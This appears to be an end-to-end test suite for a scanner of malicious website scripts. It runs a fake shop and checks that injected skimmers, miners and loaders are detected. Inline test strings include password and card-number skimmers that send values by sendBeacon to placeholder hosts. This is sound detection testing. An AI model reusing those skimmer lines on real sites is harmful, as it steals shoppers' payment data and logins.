// End-to-end test: serve a fake shop, baseline it clean, inject a skimmer, rescan, assert findings.
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
const execFileP = promisify(execFile);
import { fileURLToPath } from 'node:url';
import { whereToLook } from '../lib/origin.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(here, '..');
const siteDir = path.join(here, 'site');
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'fescan-'));
let infected = false;

const listen = (handler) =>
  new Promise((res) => {
    const s = http.createServer(handler).listen(0, '127.0.0.1', () => res(s));
  });

const thirdSeen = [];
const third = await listen((req, res) => {
  thirdSeen.push(req.headers);
  res.writeHead(200, { 'content-type': req.url.endsWith('.js') ? 'application/javascript' : 'text/plain' });
  res.end(req.url.endsWith('.js') ? 'console.log("evil")' : 'ok');
});
const PORT2 = third.address().port;

const seenUA = new Set();
const firstSeen = [];
const first = await listen((req, res) => {
  seenUA.add(req.headers['user-agent']);
  firstSeen.push({ url: req.url, headers: req.headers });
  const p = req.url.split('?')[0];
  const sub = (s) => s.replaceAll('PORT2', PORT2).replaceAll(btoa('http://localhost:PORT2/evil.js'), btoa(`http://localhost:${PORT2}/evil.js`));
  if (p === '/js/app.js') {
    res.writeHead(200, { 'content-type': 'application/javascript' });
    return res.end(sub(fs.readFileSync(path.join(siteDir, 'js', infected ? 'app.js.infected' : 'app.js.clean'), 'utf8')));
  }
  const file = p === '/' ? 'index.html' : p.slice(1);
  const fp = path.join(siteDir, file);
  if (!fs.existsSync(fp)) return res.writeHead(404).end();
  if (fp.endsWith('.xml')) {
    res.writeHead(200, { 'content-type': 'application/xml' });
    return res.end(sub(fs.readFileSync(fp, 'utf8')).replaceAll('BASE', base));
  }
  if (fp.endsWith('.js')) {
    res.writeHead(200, { 'content-type': 'application/javascript' });
    return res.end(fs.readFileSync(fp));
  }
  if (p === '/posture.html') {
    res.setHeader('Set-Cookie', 'PHPSESSID=abc; Path=/');
    res.setHeader('Content-Security-Policy', "script-src 'self' 'unsafe-eval' 'unsafe-inline' http://localhost:*");
  }
  let html = sub(fs.readFileSync(fp, 'utf8'));
  // inline nonce changes per request; normalization should hide it
  html = html.replace('a1b2c3d4e5f6a7b8', Math.random().toString(16).slice(2, 18));
  res.writeHead(200, { 'content-type': 'text/html' });
  res.end(html);
});
const base = `http://127.0.0.1:${first.address().port}`;

const cfg = {
  options: { profiles: ['desktop'], waitMs: 500, concurrency: 2 },
  sites: [
    {
      name: 'Test shop',
      firstParty: ['127.0.0.1'],
      urls: [`${base}/`, `${base}/miner.html`],
      // Custom interactions on the home page only: a click that reveals a payment form, a click on the real
      // submit button (the guard must block it), and a script hook.
      interactions: [
        { match: '/\\/$/', steps: [{ click: '#show-pay', label: 'open payment' }, { click: 'form button', label: 'press pay' }, { wait: 200 }] },
        { match: '/\\/$/', script: 'hook.mjs' },
      ],
    },
  ],
};
fs.writeFileSync(
  path.join(tmp, 'hook.mjs'),
  `export default async function ({ page, step, log }) {
     log('hook started');
     await step('hook load', () => page.evaluate(() => { const s = document.createElement('script'); s.src = '/js/on-hook.js'; document.head.appendChild(s); }));
   }`
);
fs.writeFileSync(path.join(tmp, 'sites.json'), JSON.stringify(cfg));

// Scans never pick up a developer's own config.json: point the default at a file that doesn't exist.
const childEnv = { ...process.env, SCAN_GLOBAL_CONFIG: path.join(tmp, 'no-global-config.json') };
const runRaw = async (argv) => (await execFileP(process.execPath, [path.join(root, 'scan.mjs'), ...argv], { encoding: 'utf8', env: childEnv })).stdout;
const scanned = (dir) => JSON.parse(fs.readFileSync(path.join(dir, 'report.json'), 'utf8')).sites.flatMap((s) => s.pages.map((p) => new URL(p.url).pathname)).sort();

const run = async (extra = []) =>
  (await execFileP(process.execPath, [path.join(root, 'scan.mjs'), '--config', path.join(tmp, 'sites.json'), '--baseline', path.join(tmp, 'baseline.json'), '--out', path.join(tmp, 'reports'), ...extra], {
    encoding: 'utf8',
    env: childEnv,
  })).stdout;

// Posture rules (headers, cookies…) fire on the bare test server; "clean" means no compromise findings.
const POSTURE = new Set(['csp-missing', 'csp-weak', 'csp-report-only', 'hsts-missing', 'nosniff-missing', 'clickjacking-unprotected', 'referrer-policy-missing', 'sri-missing', 'session-cookie-insecure', 'token-in-storage', 'mixed-content']);
const real = (pg) => pg.issues.filter((i) => i.severity !== 'info' && !POSTURE.has(i.type));

let failures = 0;
const check = (cond, msg) => {
  console.log(`${cond ? 'PASS' : 'FAIL'}  ${msg}`);
  if (!cond) failures++;
};

console.log('--- rule fixtures (no browser)');
{
  const { analyzeCode } = await import('../lib/heuristics.mjs');
  const dir = (d) => fs.readdirSync(path.join(here, 'rules', d)).filter((f) => f.endsWith('.js')).map((f) => [f, fs.readFileSync(path.join(here, 'rules', d, f), 'utf8')]);
  // Each positive sample names the rule(s) it must trigger in a "// expect: rule-a, rule-b" header.
  for (const [f, code] of dir('positive')) {
    const want = (code.match(/^\/\/ expect: (.+)$/m) || [, 'skimmer-field-harvest'])[1].split(/,\s*/);
    const got = analyzeCode(code);
    const ok = want.every((w) => got.some((g) => g.rule === w && g.line >= 1));
    check(ok, `sample ${f} triggers ${want.join(' + ')} with a location (got: ${got.map((g) => `${g.rule}@${g.line}:${g.column}`).join(', ') || 'nothing'})`);
  }
  for (const [f, code] of dir('negative')) {
    const bad = analyzeCode(code).filter((x) => x.severity !== 'low');
    check(!bad.length, `legitimate sample ${f} has no high/medium findings${bad.length ? ': ' + bad.map((h) => h.rule).join(', ') : ''}`);
  }
  // GTM tag matching on a synthetic container.
  const { parseGtmTags, matchGtmTags } = await import('../lib/gtm.mjs');
  const gtmBody = 'var data = {"resource":{"tags":[{"function":"__html","vtp_html":"<script type=\\"text/gtmscript\\">window.__tagFired = \\"custom-html-tag\\";</script>","tag_id":42},{"function":"__awct","vtp_conversionId":"736740096","tag_id":7},{"function":"__cl","tag_id":99}]}};';
  const gtmTags = parseGtmTags(gtmBody);
  check(gtmTags.length === 2 && !gtmTags.some((t) => t.id === 99), `GTM container parsed, listeners skipped (${gtmTags.map((t) => t.id + ':' + t.type)})`);
  check(matchGtmTags(gtmTags, { code: 'window.__tagFired = "custom-html-tag";' })[0]?.id === 42, 'inline code matched to its Custom HTML tag');
  check(matchGtmTags(gtmTags, { url: 'https://www.googletagmanager.com/gtag/js?id=AW-736740096&cx=c' })[0]?.id === 7, 'gtag.js matched to the Ads conversion tag by its ID');
  const pwSkim = `document.addEventListener('blur',function(){var p=document.querySelector('input[type=password]');if(p&&p.value)navigator.sendBeacon('https://stat-cdn.example/l',btoa(p.value));},true);`;
  check(analyzeCode(pwSkim).some((x) => x.rule === 'credential-harvest'), 'password field + beacon nearby is flagged credential-harvest');
  const pwExclude = `const sel=['input',':not([type=password])',':not([type=hidden])'].join('');document.querySelectorAll(sel).forEach(function(i){i.addEventListener('change',track)});function track(){navigator.sendBeacon('https://events.vendor.example/e',JSON.stringify({f:1}))}`;
  check(!analyzeCode(pwExclude).some((x) => x.rule === 'credential-harvest'), 'selector that excludes password fields is not flagged');
  // Every ingredient present, but far apart: what a big SDK looks like. Then a compact skimmer appended.
  const pad = (n) => Array.from({ length: n }, (_, i) => `function f${i}(a){return a+${i};}`).join('\n');
  const bundle = `var fields=['cc_number','cvv'];\n${pad(3000)}\nfetch('https://cdn.vendor.example/collect');\n${pad(3000)}\nel.addEventListener('change',h);var v=el.value;\n${pad(3000)}`;
  check(!analyzeCode(bundle).some((x) => x.severity === 'high'), 'large bundle with card words, fetch and .value far apart is not flagged high');
  const appended = bundle + `\n;(function(){document.addEventListener('blur',function(){var n=document.querySelector('#cc-number');if(n&&n.value)navigator.sendBeacon('https://img-stat.example/p',btoa(n.value));},true);})();`;
  const hit = analyzeCode(appended).find((x) => x.rule === 'skimmer-field-harvest');
  check(hit && hit.line > 9000, `compact skimmer appended to the bundle is flagged at its line (${hit ? hit.line + ':' + hit.column : 'not flagged'})`);
}

console.log('--- run 1: clean site, write baseline');
console.log(await run(['--update-baseline']));
let r = JSON.parse(fs.readFileSync(path.join(tmp, 'reports', 'report.json'), 'utf8'));
let home = r.sites[0].pages.find((p) => p.url.endsWith('/'));
let miner = r.sites[0].pages.find((p) => p.url.endsWith('miner.html'));
check(!home.error && home.scripts.length > 0, 'home page loaded and scripts inventoried');
check(real(home).length === 0, `clean home page has no compromise findings${real(home).length ? ': ' + real(home).map((i) => i.rule || i.type) : ''}`);
check(home.issues.some((i) => i.type === 'csp-missing') && home.issues.some((i) => i.type === 'clickjacking-unprotected'), 'missing CSP and frame protection reported on the bare test server');
const tagInline = home.scripts.find((s) => s.inline && s.preview.includes('__tagFired'));
check(!!tagInline, 'inline script injected by tag.js was inventoried (debugger; did not stall the page)');
check(tagInline?.origin?.delivered === 'injected', 'tag-injected inline script marked as added at runtime');
check(tagInline?.origin?.trail?.[0]?.includes('/js/tag.js'), `tag-injected inline script traced to tag.js (trail: ${JSON.stringify(tagInline?.origin?.trail)})`);
const serverInline = home.scripts.find((s) => s.inline && s.preview.includes('dataLayer'));
check(serverInline?.origin?.delivered === 'html', 'server-sent inline script marked as in the page HTML');
const phaseOf = (end) => home.scripts.find((s) => s.url.endsWith(end))?.phase;
check(phaseOf('/js/app.js') === 'load', `script in the page HTML is tagged as page load (${phaseOf('/js/app.js')})`);
check(phaseOf('/js/on-scroll.js') === 'scroll', `scroll-gated script tagged as loaded on scroll (${phaseOf('/js/on-scroll.js')})`);
check(phaseOf('/js/on-input.js') === 'form-input', `card-typing-gated script tagged as loaded on form input (${phaseOf('/js/on-input.js')})`);
check(phaseOf('/js/on-click.js') === 'custom:open payment', `custom click step tags what it loads (${phaseOf('/js/on-click.js')})`);
check(phaseOf('/js/on-hook.js') === 'custom:hook load', `script hook step tags what it loads (${phaseOf('/js/on-hook.js')})`);
check(home.blockedSubmissions.some((b) => b.method === 'POST' && b.url.endsWith('/pay')), 'clicking the real Pay button was blocked by the submission guard');
check(home.finalUrl === home.url, 'page did not navigate away after the blocked submit');
check(home.interactions.filter((i) => !i.note).every((i) => i.ok), `all custom steps ran: ${JSON.stringify(home.interactions.map((i) => [i.label, i.ok, i.error]))}`);
check(!r.sites[0].pages.find((p) => p.url.endsWith('miner.html')).interactions.length, 'interaction "match" limits steps to matching URLs');
const modChunk = home.scripts.find((s) => s.url.endsWith('/js/mod-chunk.js'));
check(modChunk?.origin?.parent?.endsWith('/js/mod-entry.js'), `ES module chunk linked to its importer (parent: ${modChunk?.origin?.parent})`);
const tagJs = home.scripts.find((s) => s.url.includes('/js/tag.js'));
check(tagJs?.origin?.delivered === 'html' && tagJs.origin.trail.at(-1) === 'page HTML', 'tag.js traced to the page HTML');
const mt = new Set(miner.issues.map((i) => i.rule || i.type));
check(mt.has('eval-decoded'), 'miner page: eval(atob()) flagged');
check(mt.has('cryptominer'), 'miner page: CoinHive flagged');
check(mt.has('cloaked-redirect'), 'miner page: referrer-gated redirect flagged');
check(mt.has('hidden-iframe'), 'miner page: hidden third-party iframe flagged');
check(miner.issues.some((i) => i.type === 'handler-runs-decoded-code' && i.severity === 'high'), 'miner page: <svg onload="setTimeout(atob(…))"> flagged high');
const dyn = miner.issues.find((i) => i.rule === 'stripe-secret-key');
check(/^dynamically created code dynamic#/.test(dyn?.script || ''), `payload run via new Function(fetched text) was pattern-checked (${dyn?.script})`);
check(/created by loader\.js:\d+:\d+/.test(dyn?.origin?.via || ''), `dynamic code traced to the loader that ran it (${dyn?.origin?.via})`);
check(miner.issues.some((i) => i.rule === 'remote-code-exec'), 'miner page: loader running fetched code flagged remote-code-exec');

console.log('--- run 2: clean again (noise check)');
await run();
r = JSON.parse(fs.readFileSync(path.join(tmp, 'reports', 'report.json'), 'utf8'));
home = r.sites[0].pages.find((p) => p.url.endsWith('/'));
check(real(home).length === 0, 'rescan of unchanged site (with rotating nonce) is quiet');

console.log('--- run 3: skimmer injected into first-party app.js');
infected = true;
const out3 = await run(['--show-scripts']);
console.log(out3);
check(/Third-party scripts \(1 across 1 host\)\n\s+page HTML\n\s+└─ \S+\/js\/app\.js \(1st-party\).*FLAGGED high: .*skimmer-field-harvest@\d+:\d+.*\n.*↳ <script src> in page HTML, line \d+\n\s+└─ \S+\/evil\.js {2}NEW.*\n.*↳ inserted by app\.js:\d+:\d+/.test(out3), '--show-scripts tree: evil.js (NEW) under app.js, with rule ids, locations and how each got there');
r = JSON.parse(fs.readFileSync(path.join(tmp, 'reports', 'report.json'), 'utf8'));
home = r.sites[0].pages.find((p) => p.url.endsWith('/'));
const ht = new Set(home.issues.map((i) => i.rule || i.type));
check(ht.has('changed-script'), 'app.js change detected vs baseline');
check(ht.has('skimmer-field-harvest'), 'card-field harvesting flagged');
check(ht.has('script-injection-decoded'), 'atob() script injection flagged');
check(ht.has('new-domain'), 'new exfil domain detected');
const skim = home.issues.find((i) => i.rule === 'skimmer-field-harvest');
check(skim?.line >= 1 && skim?.column >= 1 && /cc_number/.test(skim?.context || ''), `skimmer finding has line/column and code snippet (${skim?.line}:${skim?.column})`);
check(/sent to localhost/.test(skim?.match || ''), `skimmer finding names the destination (${skim?.match})`);
check(/^<script src> in page HTML, line \d+$/.test(skim?.origin?.via || ''), `finding says how the script got there (${skim?.origin?.via})`);
const newScript = home.issues.find((i) => i.type === 'new-script' && i.script.includes('evil.js'));
check(newScript?.origin?.trail?.[0]?.includes('/js/app.js'), `injected evil.js traced to app.js (trail: ${JSON.stringify(newScript?.origin?.trail)})`);
check(/first-party script/.test(newScript?.origin?.hint || ''), 'evil.js hint points at the first-party file');
const newDomain = home.issues.find((i) => i.type === 'new-domain');
check(newDomain?.origin?.trail?.[0]?.includes('/js/app.js'), 'new exfil domain traced to app.js');
check(/Google Tag Manager \(GTM-ABC\)/.test(whereToLook({ kind: 'inline', delivered: 'injected', trail: [{ url: 'https://www.googletagmanager.com/gtm.js?id=GTM-ABC', label: 'x' }] })), 'GTM loader produces a GTM hint with container ID');

console.log('--- fail-on gate');
let exit = 0;
try {
  await run(['--fail-on', 'high', '--format', 'html,md,console']);
} catch (e) {
  exit = e.code;
}
check(exit === 1, '--fail-on high exits 1 when high findings exist');
let csvErr = '';
try {
  await run(['--format', 'csv']);
} catch (e) {
  csvErr = e.code === 2 ? e.stderr : '';
}
check(/--format csv was removed.*jq/.test(csvErr), '--format csv explains the jq alternative (exit 2)');

console.log('--- discovery modes');
const opt = path.join(tmp, 'opts.json');
fs.writeFileSync(opt, JSON.stringify({ options: { waitMs: 300, concurrency: 3 } }));
const crawlCfg = path.join(tmp, 'crawl.json');
fs.writeFileSync(crawlCfg, JSON.stringify({ options: { waitMs: 300, concurrency: 3 }, sites: [{ name: 'Crawl', mode: 'crawl', firstParty: ['127.0.0.1'], urls: [`${base}/`] }] }));
const outDir = (n) => path.join(tmp, 'out-' + n);
const nb = path.join(tmp, 'none.json');

await runRaw(['--config', crawlCfg, '--baseline', nb, '--out', outDir('crawl')]);
check(JSON.stringify(scanned(outDir('crawl'))) === JSON.stringify(['/', '/about.html', '/deep.html']), `crawl (depth 2) stays on-site, skips pdf/login/anchors/queries: ${scanned(outDir('crawl'))}`);
await runRaw(['--config', crawlCfg, '--baseline', nb, '--out', outDir('crawl1'), '--depth', '1']);
check(JSON.stringify(scanned(outDir('crawl1'))) === JSON.stringify(['/', '/about.html']), `--depth 1 limits crawl: ${scanned(outDir('crawl1'))}`);
await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('crawl-cli'), '--urls', `${base}/`, '--mode', 'crawl', '--max-pages', '2']);
check(scanned(outDir('crawl-cli')).length === 2, `--max-pages 2 caps the crawl: ${scanned(outDir('crawl-cli'))}`);

await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('sm'), '--sitemap', `${base}/sitemap.xml`, '--user-agent', 'fe-scan-test-ua/1.0']);
check(JSON.stringify(scanned(outDir('sm'))) === JSON.stringify(['/', '/about.html', '/deep.html']), `remote sitemap index followed, off-site entry skipped: ${scanned(outDir('sm'))}`);
check(seenUA.has('fe-scan-test-ua/1.0'), '--user-agent is sent by the sitemap fetch and the browser');
await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('ua'), '--urls', `${base}/about.html`, '--user-agent', 'fe-scan-page-ua/2.0']);
check(seenUA.has('fe-scan-page-ua/2.0'), '--user-agent is used for page loads');
console.log('--- --interactions on the command line');
const homeOf = (dir) => JSON.parse(fs.readFileSync(path.join(dir, 'report.json'), 'utf8')).sites[0].pages[0];
const cliRun = async (name, ...vals) => {
  await runRaw(['--config', opt, '--baseline', nb, '--out', outDir(name), '--urls', `${base}/`, ...vals.flatMap((v) => ['--interactions', v])]);
  return homeOf(outDir(name));
};
const clickPhase = (pg) => pg.scripts.find((s) => s.url.endsWith('/js/on-click.js'))?.phase;
let pg = await cliRun('cli-json', '[{"click":"#show-pay","label":"cli json"}]');
check(clickPhase(pg) === 'custom:cli json', `inline JSON steps (${clickPhase(pg)})`);
fs.writeFileSync(path.join(tmp, 'steps.json'), JSON.stringify({ steps: [{ click: '#show-pay', label: 'json file' }] }));
pg = await cliRun('cli-jsonfile', path.join(tmp, 'steps.json'));
check(clickPhase(pg) === 'custom:json file', `JSON file block (${clickPhase(pg)})`);
fs.writeFileSync(path.join(tmp, 'cli-hook.mjs'), `export default async ({ page, step }) => { await step('hook file', () => page.click('#show-pay')); }`);
pg = await cliRun('cli-hook', path.join(tmp, 'cli-hook.mjs'));
check(clickPhase(pg) === 'custom:hook file', `hook file (${clickPhase(pg)})`);
pg = await cliRun('cli-js', "await step('inline js', () => page.click('#show-pay'));");
check(clickPhase(pg) === 'custom:inline js', `inline JavaScript (${clickPhase(pg)})`);
let missing = 0;
try {
  await cliRun('cli-missing', './nope.json');
} catch (e) {
  missing = e.code === 2 && /file not found/.test(e.stderr);
}
check(missing, 'missing --interactions file is a clear error (exit 2), not run as code');
console.log('--- usage and argument errors');
{
  const help = await runRaw(['--help']);
  check(/^Usage:/m.test(help) && /--disable-rule/.test(help) && /--interactions/.test(help), '--help prints the usage screen (exit 0)');
  check(/^ScriptHound: sniffs out malicious front-end code/.test(help), '--help leads with the ScriptHound name and tagline');
  const argFail = async (argv) => {
    try {
      await runRaw(argv);
      return { code: 0, stderr: '' };
    } catch (e) {
      return { code: e.code, stderr: e.stderr };
    }
  };
  let r = await argFail(['--urlz', 'https://x.example/']);
  check(r.code === 2 && /Did you mean --urls\?/.test(r.stderr) && /--help/.test(r.stderr), `mistyped flag suggests the right one (${r.stderr.split('\n')[0]})`);
  r = await argFail(['https://x.example/']);
  check(r.code === 2 && /use --urls https:\/\/x\.example\//.test(r.stderr), 'bare URL argument points to --urls');
  r = await argFail(['--mode']);
  check(r.code === 2 && /needs a value/.test(r.stderr), 'flag without its value is a clear error');
  // Every option must be documented in --help.
  const src = fs.readFileSync(path.join(root, 'scan.mjs'), 'utf8');
  const opts = [...src.slice(src.indexOf('const OPTIONS = {'), src.indexOf('};', src.indexOf('const OPTIONS = {'))).matchAll(/^\s+'?([a-z-]+)'?: \{ type:/gm)].map((m) => m[1]);
  const undocumented = opts.filter((o) => !help.includes('--' + o));
  check(opts.length > 20 && !undocumented.length, `every option appears in --help${undocumented.length ? ' (missing: ' + undocumented.join(', ') + ')' : ''}`);
}

console.log('--- rule configuration (config.json + site rules + CLI)');
{
  const glob = path.join(tmp, 'config.json');
  fs.writeFileSync(glob, JSON.stringify({
    rules: { 'hidden-iframe': { severity: 'low', reason: 'test downgrade' }, 'eval-decoded': 'off' },
    customRules: [{ id: 'tag-marker', severity: 'medium', target: 'code', pattern: '__tagFired', description: 'Test marker in code' }],
    suppress: [{ rule: 'cryptominer', page: 'miner.html', reason: 'test suppression' }],
  }));
  const siteCfg = path.join(tmp, 'rules-sites.json');
  fs.writeFileSync(siteCfg, JSON.stringify({
    options: { waitMs: 300, concurrency: 2 },
    sites: [{
      name: 'Rules shop', firstParty: ['127.0.0.1'], urls: [`${base}/`, `${base}/miner.html`],
      customRules: [
        { id: 'shop-title', severity: 'low', target: 'html', pattern: '<title>Shop</title>', description: 'Test HTML marker' },
        { id: 'third-party-host', severity: 'medium', target: 'url', pattern: 'localhost', description: 'Test URL marker' },
      ],
    }],
  }));
  await runRaw(['--config', siteCfg, '--global-config', glob, '--baseline', nb, '--out', outDir('rules'), '--disable-rule', 'whitespace-decode']);
  const rr = JSON.parse(fs.readFileSync(path.join(outDir('rules'), 'report.json'), 'utf8'));
  const [rh, rm] = [rr.sites[0].pages.find((p) => p.url.endsWith('/')), rr.sites[0].pages.find((p) => p.url.endsWith('miner.html'))];
  check(!rm.issues.some((i) => i.rule === 'eval-decoded') && rm.issues.some((i) => i.rule === 'cloaked-redirect'), 'config.json "off" removes that rule only');
  const hi = rm.issues.find((i) => i.type === 'hidden-iframe');
  check(hi?.severity === 'low' && hi?.originalSeverity === 'medium', `severity override applied and original kept (${hi?.severity}, was ${hi?.originalSeverity})`);
  check(!rm.issues.some((i) => i.rule === 'cryptominer') && rm.suppressed?.some((i) => i.rule === 'cryptominer' && i.suppressedBy === 'test suppression'), 'suppression hides the finding but keeps it in the report with its reason');
  check(rr.sites[0].rules.suppress[0].hits >= 1, `suppression hit count recorded (${rr.sites[0].rules.suppress[0].hits})`);
  const tm = rh.issues.find((i) => i.rule === 'tag-marker');
  check(tm?.custom && tm.line >= 1 && tm.severity === 'medium', `global custom code rule fires with a location (${tm ? tm.script + ' @' + tm.line + ':' + tm.column : 'none'})`);
  check(rh.issues.some((i) => i.rule === 'shop-title' && i.htmlLine >= 1), 'site custom html rule fires with the HTML line');
  check(rm.issues.some((i) => i.rule === 'third-party-host' && i.custom), 'site custom url rule fires');
  check(rr.sites[0].rules.changed.some((c) => c.id === 'whitespace-decode' && c.severity === 'off' && c.source === 'command line'), '--disable-rule is applied and listed in the report');
  const md = fs.readFileSync(path.join(outDir('rules'), 'report.md'), 'utf8');
  check(/Rule changes in effect/.test(md) && /eval-decoded turned OFF/.test(md) && /test suppression; hid \d+ finding/.test(md), 'report.md lists rule changes and suppressions');
  let bad = '';
  try {
    await runRaw(['--config', siteCfg, '--global-config', glob, '--baseline', nb, '--out', outDir('rules-bad'), '--disable-rule', 'no-such-rule']);
  } catch (e) {
    bad = e.code === 2 ? e.stderr : '';
  }
  check(/unknown rule "no-such-rule"/.test(bad), 'unknown rule id is a clear error (exit 2)');
  fs.writeFileSync(path.join(tmp, 'bad-config.json'), JSON.stringify({ customRules: [{ id: 'broken', severity: 'high', pattern: '([' }] }));
  bad = '';
  try {
    await runRaw(['--config', siteCfg, '--global-config', path.join(tmp, 'bad-config.json'), '--baseline', nb, '--out', outDir('rules-bad')]);
  } catch (e) {
    bad = e.code === 2 ? e.stderr : '';
  }
  check(/invalid pattern/.test(bad), 'invalid custom regex is a clear error (exit 2)');
  const listed = await runRaw(['--config', siteCfg, '--global-config', glob, '--list-rules', '--site', 'Rules shop', '--color', 'never']);
  check(/OFF\s+eval-decoded/.test(listed) && /tag-marker/.test(listed) && /shop-title/.test(listed) && /test suppression/.test(listed), '--list-rules shows effective settings, custom rules and suppressions');
}
console.log('--- security posture checks');
{
  await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('posture'), '--urls', `${base}/posture.html`]);
  let pp = homeOf(outDir('posture'));
  const has = (t) => pp.issues.find((i) => i.type === t);
  check(/unsafe-eval/.test(has('csp-weak')?.message || '') && !has('csp-missing'), `weak CSP named (${has('csp-weak')?.message})`);
  const vl = has('vulnerable-library');
  check(/jquery 1\.12\.4/.test(vl?.message || '') && /CVE-2020-11022/.test(vl.message) && vl.severity === 'low', `old jQuery found with CVEs (${vl?.message}, ${vl?.severity})`);
  check(/localhost/.test(has('sri-missing')?.message || '') && has('sri-missing').severity === 'info', 'third-party script without SRI noted (info off payment pages)');
  const ck = Object.fromEntries((pp.cookies || []).map((c) => [c.name, c]));
  check(ck.PHPSESSID?.setBy === 'server' && ck.js_pref?.setBy === 'javascript', `cookie inventory knows who set each cookie (PHPSESSID: ${ck.PHPSESSID?.setBy}, js_pref: ${ck.js_pref?.setBy})`);
  check(/PHPSESSID \(missing HttpOnly\)/.test(has('session-cookie-insecure')?.message || ''), 'session cookie without HttpOnly flagged');
  // (The fixture's own inline script contains the token text, so check the storage data, not the whole report.)
  check(/localStorage\.access_token/.test(has('token-in-storage')?.message || '') && !JSON.stringify([pp.storageTokens, has('token-in-storage')]).includes('c2lnbmF0dXJl'), 'JWT in localStorage flagged without storing its value');
  check(!has('dom-xss-canary'), 'no DOM-XSS probe unless asked');
  await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('canary'), '--urls', `${base}/posture.html`, '--dom-xss-canary']);
  pp = homeOf(outDir('canary'));
  check(pp.issues.some((i) => i.type === 'dom-xss-canary' && /div id="out"/.test(i.match)), '--dom-xss-canary finds the fragment-to-innerHTML sink');

  // Logged-in scan: header to first-party only, cookie preset, nothing secret in the report.
  firstSeen.length = 0;
  thirdSeen.length = 0;
  await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('auth'), '--urls', `${base}/posture.html,${base}/`, '--header', 'X-Test-Auth: hunter2-secret', '--cookie', 'auth_c=tok-secret-123', '--interactions', '[{"click":"form button","label":"press pay"}]']);
  const authReport = fs.readFileSync(path.join(outDir('auth'), 'report.json'), 'utf8');
  check(firstSeen.some((r) => r.headers['x-test-auth'] === 'hunter2-secret' && /auth_c=tok-secret-123/.test(r.headers.cookie || '')), 'auth header and cookie reach the site');
  check(thirdSeen.length > 0 && !thirdSeen.some((h) => h['x-test-auth']), `auth header NOT sent to third-party hosts (${thirdSeen.length} third-party requests checked)`);
  check(!/hunter2-secret|tok-secret-123/.test(authReport), 'header and cookie values never appear in the report');
  const ar = JSON.parse(authReport);
  check(ar.sites[0].auth?.headers.includes('X-Test-Auth') && ar.sites[0].auth?.cookies.includes('auth_c'), 'report lists auth header/cookie names');
  const ah = ar.sites[0].pages.find((p) => p.url.endsWith('/'));
  check(ah.blockedSubmissions.some((b) => b.method === 'POST'), 'submission guard still works on logged-in scans');
  check(Object.keys(JSON.parse(fs.readFileSync(path.join(outDir('auth'), 'baseline.next.json'), 'utf8')).pages).every((k) => k.endsWith('|auth')), 'logged-in pages get their own baseline keys');
  check((ar.sites[0].pages[0].cookies || []).some((c) => c.name === 'auth_c' && c.setBy === 'you (auth)'), 'preset cookies are labeled as yours in the inventory');
}
console.log('--- browser storage inventory and card-data honeytoken');
{
  const out = await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('storage'), '--urls', `${base}/stash.html`, '--show-storage', '--color', 'never']);
  const sp = homeOf(outDir('storage'));
  const cd = sp.issues.find((i) => i.type === 'card-data-in-storage');
  check(cd?.severity === 'high' && /base64-encoded in localStorage "cus_customer_id"/.test(cd.message), `typed dummy card found base64-encoded in localStorage (${cd?.message})`);
  const stash = sp.storage.find((x) => x.key === 'cus_customer_id');
  check(stash?.firstWritten === 'form-input' && stash.kind === 'base64 blob', `storage key records when it was first written (${stash?.firstWritten}, ${stash?.kind})`);
  check(sp.storage.some((x) => x.type === 'sessionStorage' && x.key === 'checkout_step' && x.firstWritten === 'load'), 'sessionStorage keys inventoried with their phase');
  check(sp.indexedDB.some((d) => d.name === 'shopdb' && d.stores.some((st) => st.name === 'carts' && st.count === 1)), 'IndexedDB databases, stores and record counts inventoried');
  check(sp.cacheStorage.some((k) => k.name === 'assets-v1' && k.entries === 1), 'Cache Storage inventoried');
  check(sp.serviceWorkers.some((w) => /\/sw\.js$/.test(w.scriptURL)), `service worker inventoried (${sp.serviceWorkers.map((w) => w.scriptURL)})`);
  check(/Browser storage \(/.test(out) && /cus_customer_id/.test(out) && /form input/.test(out), '--show-storage prints the inventory');
  const cis = sp.issues.filter((i) => i.type === 'code-in-storage');
  check(cis.some((i) => /localStorage "payload_cache"/.test(i.message)) && cis.some((i) => /"b64_payload".*after base64-decoding/.test(i.message)), `JavaScript in storage found, plain and base64-encoded (${cis.length})`);
  check(sp.issues.some((i) => i.rule === 'script-injection-decoded' && /localStorage "payload_cache"/.test(i.script)), 'pattern rules run on storage values');
  check(sp.issues.some((i) => i.rule === 'eval-decoded' && /IndexedDB "loaderdb\/chunks"/.test(i.script)), 'IndexedDB records are sampled and pattern-checked');
  const inStorage = (where) => sp.issues.some((i) => (i.script || '').startsWith(where) && (i.type === 'suspicious-code' || i.type === 'code-in-storage'));
  for (const where of ['sessionStorage', 'localStorage', 'IndexedDB', 'Cache Storage', 'service worker', 'OPFS file', 'window.name', 'history.state', 'cookie']) {
    if (where === 'sessionStorage') continue; // no code stored there in the fixture
    check(inStorage(where), `code checks cover ${where} (${sp.issues.filter((i) => (i.script || '').startsWith(where)).map((i) => i.rule || i.type).join(', ') || 'nothing found'})`);
  }
  check(sp.opfs.some((f) => f.path === '/db/app.sqlite' && f.sqlite), `OPFS files listed, SQLite recognised (${JSON.stringify(sp.opfs)})`);
  check(!JSON.stringify([sp.storage, sp.cookies, sp.windowName, sp.historyState]).includes('"value"') && !sp.indexedDB.some((d) => d.stores.some((st) => st.samples)), 'without --show-values no values or record samples are kept');

  // --show-values: full values in console and report, except what you supplied.
  const sv = await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('values'), '--urls', `${base}/posture.html`, '--show-values', '--cookie', 'auth_c=very-secret-1', '--color', 'never']);
  const vp = homeOf(outDir('values'));
  const vc = Object.fromEntries(vp.cookies.map((c) => [c.name, c.value]));
  check(vc.PHPSESSID === 'abc' && vc.js_pref === '1', `--show-values includes cookie values (${JSON.stringify(vc)})`);
  check(/supplied by you/.test(vc.auth_c) && !fs.readFileSync(path.join(outDir('values'), 'report.json'), 'utf8').includes('very-secret-1'), 'cookies you supplied stay masked even with --show-values');
